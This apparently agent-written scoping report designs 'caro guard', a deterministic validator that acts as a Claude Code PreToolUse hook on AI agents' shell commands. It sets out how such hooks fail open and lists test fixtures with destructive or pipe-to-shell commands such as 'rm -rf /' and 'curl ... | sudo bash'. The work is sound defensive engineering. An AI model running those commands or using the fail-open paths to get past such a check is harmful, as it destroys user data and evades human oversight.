# Feature Research & Scope — `caro guard` as a Claude Code PreToolUse Hook Backend

**Date:** 2026-08-10 | **Author:** scheduled task `caro-research--scoping-process` (Cowork, non-interactive)
**Target feature researched:** Claude Code lifecycle hooks (PreToolUse decision control) + Anthropic inference hooks (Enterprise beta)
**Scope produced:** implementation scope for `caro guard` — a pure-subprocess hook backend wrapping `SafetyValidator`

> **Autonomy note:** the task template's `[FEATURE NAME]` placeholder was unfilled. Selected target per the
> 2026-08-10 weekly market scan's top recommendation (opportunity B: "Caro as an Anthropic inference-hook /
> policy-server backend") and its `Next step`. The Claude Code PreToolUse hook contract is the shipping,
> documented instance of that socket; the Enterprise inference-hook beta is the same shape over HTTP.
> **Key discovery:** this feature already has a proposed, unimplemented ADR —
> `docs/adr/ADR-036-agent-guard-hook-adapter.md` (2026-07-14). This document is therefore an
> *implementation scope + contract refresh* against the current hook docs, not a from-scratch design.

---

## Phase 1 — Feature research: the Claude Code hook contract (as of Aug 2026)

### Problem it solves, and for whom
Hooks give operators a deterministic decision point *inside* the agent loop: before every tool call
(`PreToolUse`), Claude Code spawns a configured subprocess, passes JSON on stdin, and honors its verdict.
It exists because model-side judgment and human approval both fail — AI Digest's 40k-run study showed
humans approve ~1 in 3 dangerous agent commands under review load. The hook socket is where a
deterministic reviewer plugs in. Anthropic's Enterprise "inference hooks" beta (~Aug 8) is the same
pattern for orgs: route each interaction through your own security server for allow/deny. The socket
ships; the *reviewer* behind it does not. That reviewer is Caro's exact shape.

### The contract (verified against the official hooks reference, fetched today)

**stdin (PreToolUse):** `{session_id, prompt_id, transcript_path, cwd, permission_mode, hook_event_name,
tool_name, tool_input, tool_use_id}` (+ `agent_id`/`agent_type` inside subagents; `effort`).
For `tool_name: "Bash"`, `tool_input` = `{command, description, timeout, run_in_background}`.
`permission_mode` ∈ `default|plan|acceptEdits|auto|dontAsk|bypassPermissions`.

**stdout (exit 0 only):** JSON object, nothing else on stdout. PreToolUse decision rides in:

```json
{"hookSpecificOutput": {"hookEventName": "PreToolUse",
  "permissionDecision": "allow" | "deny" | "ask" | "defer",
  "permissionDecisionReason": "...",
  "updatedInput": {…}, "additionalContext": "..."}}
```

`defer` (newer, under-documented — see anthropics/claude-code#41791) hands back to the normal permission
flow. `updatedInput` is honored only with `allow`/`ask`. Output strings capped at 10,000 chars.
Silence ≠ approval: exit 0 with no output falls through to the normal permission flow.

**Exit codes:** `0` = success, stdout JSON parsed. `2` = blocking error — **stdout JSON is discarded**,
stderr becomes the reason shown to Claude. **Any other exit code (including 1) is non-blocking: the
action proceeds.** The docs explicitly warn that conventional Unix exit 1 fails open.

**Lifecycle:** one subprocess spawn per matching tool call — no daemon, no session state, no
initialization handshake. Redundant-init avoidance is entirely the binary's job: cold-start cost is paid
on every tool call. Default command-hook timeout 600s (configurable per handler); env gets
`CLAUDE_PROJECT_DIR`; no controlling terminal. Matchers: exact / `|`-list / unanchored JS regex;
MCP tools as `mcp__<server>__<tool>`. All matching hooks run in parallel; cross-settings duplicates
dedupe; deny-vs-allow combination precedence is *not* fully documented.

### Why it's experimental / the failure modes (the ones we must solve by design)

| # | Failure mode | Evidence |
|---|---|---|
| F1 | **Exit-1 fail-open.** Non-2 non-zero exit codes proceed with the action. Any hook binary that signals "blocked" via exit 1 — which is what `caro` does today (`main.rs:3528`, blocked ⇒ exit 1) — silently approves. | Official docs warning; caro's own ADR-035 teardown |
| F2 | **Crash/timeout fail-open.** A crashed hook (any signal — SIGABRT = 134) is "any other exit code" ⇒ proceeds. Command-hook timeout behavior for PreToolUse is undocumented; the documented analog (UserPromptSubmit) cancels the hook and proceeds. Caro's release profile sets `panic = "abort"` ⇒ any panic in the guard path is a fail-open. | Docs §exit-codes; Cargo.toml `[profile.release]` |
| F3 | **Exit 2 discards structured output.** The "block" exit code throws away stdout JSON — you cannot ship a machine-readable assessment and hard-block via exit code simultaneously. | Docs §exit-codes |
| F4 | **Multi-hook combination bugs.** `updatedInput` from an `allow` hook is silently discarded when a sibling hook returns `ask` and the user approves (anthropics/claude-code#75915). Precedence rules undocumented. | GH issue #75915, #41791 |
| F5 | **`allow` loosens.** A hook `allow` settles the decision — a naive "Safe ⇒ allow" mapping would *bypass* the user's own permission config, making a safety tool an approval-widening tool. | Docs: hooks "not a hard enforcement mechanism"; PermissionRequest semantics |
| F6 | **Best-effort input parsing.** The `if` filter fails open on unparseable Bash; `file_path` arrives with backslashes on Windows; `@`-file reads never fire PreToolUse. | Docs §matchers/§if |

---

## Phase 2 — Competitive differentiation

**What their design gets right (replicate):** decision as *data* (JSON verdict, not just exit code);
reason strings surfaced to the model so a deny teaches the agent; `additionalContext` as a
non-blocking advisory channel; pure subprocess-per-event (no daemon = no state drift); matcher-side
filtering so the binary only sees relevant calls.

**Their gaps (avoid by designing the schema first):** no versioned output schema (F3 forces
reason-strings into a lossy channel); undocumented multi-hook precedence (F4); fail-open defaults
everywhere (F1/F2); no stable machine contract for downstream audit ingestion. We ship
`schema_version` from day one and treat the envelope, not the host dialect, as the source of truth.

**Caro's unique positioning:** (a) **offline & deterministic** — 52+ compiled patterns + CVE rules,
no network, no LLM, sub-100ms verdicts vs. their 600s-budget prompt-hook alternatives;
(b) **agent-agnostic** — same binary answers Claude Code today, `--host` dialects for gemini-cli /
generic JSON tomorrow, and the same envelope can back an Enterprise inference-hook HTTP server later
(separate ADR); (c) **tightening-only stance** — Caro never widens permissions (F5), a claim
framework-embedded guardrails can't make; (d) **the 1-in-3 story** — tiered routing
(`SuggestedRouting`) means humans only see the ambiguous slice.

**Existing infrastructure that already covers most of this** (verified in-repo today):

- `SafetyValidator::validate_command(&str, ShellType) -> ValidationResult` (`src/safety/mod.rs:459`) —
  async-with-zero-I/O (ADR-022 wart; wrap with a lightweight `block_on`, do not add a runtime dependency
  on the multithread executor).
- `ValidationResult`, `SafetyDecision` (+ `from_validation_result`), `RiskLevel`
  (`safe|moderate|high|critical`), `SuggestedRouting` (`auto_approve|async_log|human_gate|block`,
  ADR-020) — all already `Serialize`/`Deserialize`.
- Config path: `ConfigManager::new()?.load()?` → `SafetyConfig::from_user_config(...)` →
  `SafetyValidator::new(cfg)` — the exact reuse chain; **must not** route through `CliApp`
  (it builds backends + `CapabilityProfile::detect_or_cached()` — cold-start poison).
- Deps already present for the envelope: `uuid`, `sha2`, `chrono`, `schemars`, `serde_json`. Zero new deps.
- Prior art: **ADR-036** (this feature, Proposed), ADR-035 (inverse direction, contract teardown),
  ADR-022 (`SafetyAssessment` type overlap — coordinate field names), ADR-023 (`caro scan` owns the
  CI exit-code audience), root-level `caro-scope-lifecycle-hooks-2026-07-09.md`.
- Dogfooding host config exists: `.claude/settings.json` already wires PreToolUse `Bash` shell hooks —
  swap-in test bed.

---

## Phase 3 — Scope definition

### ADR

Land as **ADR-036 revision 2** (amend in place: status stays Proposed → Accepted on merge), not a new
ADR-048 — the repo's adr-numbering rule exists to prevent duplicate-topic ADRs, and ADR-036 already
holds context/decision/alternatives. The revision adds the deltas below. (If maintainers prefer a fresh
number, next free is ADR-048; ADR-036 then becomes "Superseded by ADR-048".)

**Context (delta):** contract re-verified 2026-08-10; `permissionDecision` now has a 4th value `defer`;
exit-2-discards-JSON confirmed; #75915 multi-hook bug; Enterprise inference-hook beta validates the
socket vendor-side; AI Digest 1-in-3 stat quantifies the reviewer gap.

**Decision:** ship `caro guard --host claude-code` as a pure subprocess: stdin JSON → validate →
exit 0 + host-dialect JSON verdict, always. Tightening-only by default. Fail-closed by *emission*, not
by exit code.

**Consequences:** every tool call pays validator cold-start (~pattern-regex compile; budget <100ms —
acceptable, benchmarked in CI); Caro takes a hard dependency on tracking a beta contract (mitigated:
one dialect module, envelope is stable); `panic = "abort"` leaves a residual fail-open on panics
(mitigated below; eliminated only by a profile carve-out, deferred).

**Alternatives considered:** exit-code-only protocol (rejected: F1/F3); long-lived policy server
(rejected for v1: violates pure-subprocess constraint; revisit as the inference-hook HTTP backend,
separate ADR); prompt-type hook (rejected: nondeterministic, slow, costs tokens); implementing inside
`CliApp` (rejected: cold start, backend deps).

### Design answers to the Phase-1 failure modes (by design, not workaround)

- **F1/F3:** `caro guard` **never exits 1 or 2**. Every verdict — including deny and on-error deny —
  is exit 0 + JSON (`permissionDecision: "deny"` blocks just as hard, and keeps stdout structured).
- **F2:** single top-level `run_guard() -> GuardVerdict` where *all* fallible paths return `Result`;
  the one caller converts any error into the configured `--on-error` verdict (default `deny`) and
  still exits 0. No `unwrap`/`expect`/`panic!` in the guard path (enforced by a clippy lint gate on
  the module: `#![deny(clippy::unwrap_used, clippy::expect_used, clippy::panic)]`). Residual: an
  abort-on-panic in *dependencies* still fails open — documented, plus an integration test asserting
  malformed/hostile inputs produce a verdict, not a crash.
- **F4:** we emit exactly one decision object and never rely on cross-hook combination; `updatedInput`
  is out of scope entirely.
- **F5:** default mapping is **tightening-only**: `AutoApprove → defer` (fall through to the user's own
  permission config), `AsyncLog → defer` + `additionalContext` advisory, `HumanGate → ask` + reason,
  `Block → deny` + reason. `--emit-allow` opt-in flips `AutoApprove → allow` for users who want Caro to
  *replace* prompts (the approval-fatigue play), never default.
- **F6:** unknown `tool_name` or unparseable `tool_input` → `defer` (host keeps its normal flow);
  absent/duplicate fields tolerated via `#[serde(default, deny_unknown_fields = false)]`.

### New types (existing modules only; all serde from day one)

In `src/safety/mod.rs` (beside `SafetyDecision`; field names coordinated with ADR-022's
`SafetyAssessment` so the future library crate can absorb them unchanged):

```rust
#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
pub struct AssessmentEnvelope {
    pub schema_version: String,        // "1" — bump on breaking change
    pub decision_id: uuid::Uuid,       // v4 per invocation
    pub assessed_at: chrono::DateTime<chrono::Utc>,
    pub caro_version: String,          // env!("CARGO_PKG_VERSION")
    pub command: String,
    pub command_hash: String,          // hex sha256, joins logs without leaking full cmd
    pub shell: ShellType,
    pub risk_level: RiskLevel,
    pub routing: SuggestedRouting,
    pub matched_patterns: Vec<String>,
    pub explanation: String,
    pub confidence: f32,
    pub origin: AssessmentOrigin,      // enum { Static, Cve, UserPattern, OnError }
}
// ctor: AssessmentEnvelope::from_validation(&ValidationResult, &SafetyDecision, cmd, shell)
```

In `src/cli/guard.rs` (new file in the existing `cli` module):

```rust
#[derive(Debug, Deserialize)]                 // lenient: unknown fields ignored
pub struct HookInput { pub hook_event_name: Option<String>, pub tool_name: Option<String>,
    pub tool_input: Option<serde_json::Value>, pub session_id: Option<String>,
    pub cwd: Option<String>, pub permission_mode: Option<String> }

#[derive(Debug, Clone, Copy, ValueEnum)] pub enum HostKind { ClaudeCode, Generic } // gemini-cli: next
#[derive(Debug, Clone, Copy, ValueEnum)] pub enum OnError { Deny, Defer }

#[derive(Debug, Serialize)]                   // claude-code dialect, exact casing
pub struct ClaudeHookOutput { #[serde(rename = "hookSpecificOutput")] pub hook_specific_output: HookSpecificOutput }
#[derive(Debug, Serialize)] #[serde(rename_all = "camelCase")]
pub struct HookSpecificOutput { pub hook_event_name: &'static str,      // "PreToolUse"
    pub permission_decision: PermissionDecision,                        // allow|deny|ask|defer (lowercase)
    #[serde(skip_serializing_if = "Option::is_none")] pub permission_decision_reason: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")] pub additional_context: Option<String> }
```

Mapping fn: `fn to_claude_dialect(&AssessmentEnvelope, emit_allow: bool) -> ClaudeHookOutput`
(pure, unit-testable). `--host generic` prints the raw `AssessmentEnvelope` instead.

### File change set (minimal; no new modules)

1. `src/main.rs` — `Commands::Guard { host, on_error, emit_allow, emit: Option<PathBuf> }` variant +
   dispatch arm *before* prompt resolution (bypasses backend construction entirely).
2. `src/cli/mod.rs` — `pub mod guard;`.
3. `src/cli/guard.rs` — new: input parse, validator call (current-thread `block_on`), dialect emit,
   optional `--emit <path>` append of the full envelope as JSONL (the audit-export seed, opportunity C).
4. `src/safety/mod.rs` — `AssessmentEnvelope`, `AssessmentOrigin`, ctor.
5. `src/bin/generate-schema.rs` — `schema_for!(AssessmentEnvelope)` → `docs/spec/assessment-envelope.schema.json`.
6. `tests/guard_contract.rs` + `tests/fixtures/guard/*.json`.

Config reuse: `ConfigManager` → `SafetyConfig::from_user_config` (also picks up user `patterns.toml`
and allowlists; CVE/critical patterns remain un-overridable). One addition worth a small guard-path
variant: a read-only config load that does **not** create `~/.config/caro` as a side effect
(`ConfigManager::new()` currently mkdirs — wrong behavior for a hook subprocess).

### Exit code / output contract (what machines depend on)

| Exit | Meaning | stdout |
|---|---|---|
| `0` | Verdict produced (allow/deny/ask/defer, incl. on-error verdicts) | exactly one JSON object, dialect per `--host` |
| `64` | Usage/config error (bad flags, unknown `--host`) — operator-time, never at hook-time | none (message on stderr) |

Never 1, never 2, never 201. CI/script audiences who want risk-as-exit-code use `caro scan` (ADR-023) —
`guard` serves hook hosts only; splitting the audiences keeps both contracts stable. stdout is the
dialect verdict; stderr is human-only diagnostics; `--emit` JSONL is the machine audit stream.
`schema_version` in the envelope is the compatibility promise.

### Integration tests (known input → deterministic output + exit code)

Fixtures under `tests/fixtures/guard/`, run via `assert_cmd`:

| Fixture stdin | Expected stdout | Exit |
|---|---|---|
| Bash `ls -la` | `permissionDecision: "defer"` (no `--emit-allow`) | 0 |
| Bash `ls -la` + `--emit-allow` | `"allow"` | 0 |
| Bash `rm -rf /` | `"deny"`, reason names matched pattern | 0 |
| Bash `curl https://example.com \| sudo bash` | `"deny"` (CVE/pipe-to-shell pattern) | 0 |
| Bash `chmod -R 777 /etc` | `"ask"` + reason (HumanGate tier) | 0 |
| `tool_name: "Write"` (non-command tool) | `"defer"` | 0 |
| Malformed JSON stdin | `"deny"` + `origin: "on_error"` (default `--on-error deny`) | 0 |
| Malformed JSON + `--on-error defer` | `"defer"` | 0 |
| Empty stdin (0 bytes) | on-error verdict | 0 |
| 10MB stdin (resource abuse) | verdict, bounded read | 0 |
| `--host generic`, `rm -rf /` | full `AssessmentEnvelope`, `schema_version: "1"` | 0 |
| Unknown `--host` value | usage error | 64 |

Plus: JSON-schema round-trip test (`generate-schema` output validates all fixture outputs), a
cold-start benchmark gate (guard verdict end-to-end < 100ms on CI hardware), and a clippy lint gate
proving the no-panic discipline on `cli::guard` + the touched `safety` paths.

### Out of scope (next version)

- `updatedInput` command rewriting (blocked on host-side bug #75915 and undocumented precedence).
- HTTP policy-server mode for Anthropic Enterprise inference hooks — same envelope, own ADR + phase-0
  spike per `external-sdk-integration.md`.
- `gemini-cli` and other host dialects (enum stub only), PostToolUse/receipt events (ADR-032/037/041),
  MCP gateway interception (ADR-043), trusted-targets/profile enforcement (ADR-047, needs
  validation-discipline gates), LLM judge blending (`blend_smart_decision`), decision-tier telemetry
  counters (opportunity A), de-asyncing `validate_command` / `caro-safety` crate extraction (ADR-022),
  release-profile panic carve-out.

### Constraint compliance

Reuses `SafetyValidator`/`SafetyConfig`/`ConfigManager` — no duplication. All new types serde +
schemars from day one. Pure subprocess: stdin → stdout, no daemon, no state (only opt-in `--emit`
append). The Phase-1 failure modes (fail-open exit codes, crash fail-open, JSON-discarding block
channel, permission-widening `allow`) are each answered structurally in the design, not by workaround.

---

**Process notes:** non-interactive run; no write actions beyond this report file (not committed —
repo rules require a feature branch and PR for any commit; implementation should start with
`bin/sk-new-feature "caro guard hook adapter"`). Codebase facts verified by a read-only exploration
agent today; hook contract verified against the official hooks reference (fetched 2026-08-10, one
section past truncation reconstructed via search + GitHub issues, flagged inline).

**Sources:** [Claude Code hooks reference](https://code.claude.com/docs/en/hooks) ·
[issue #75915 — updatedInput discarded across sibling hooks](https://github.com/anthropics/claude-code/issues/75915) ·
[issue #41791 — `defer` under-documented](https://github.com/anthropics/claude-code/issues/41791) ·
[Agent SDK hooks](https://platform.claude.com/docs/en/agent-sdk/hooks) ·
in-repo: ADR-020/022/023/035/036, `.hermes/digests/2026-08-10-weekly-agent-market-scan.md`
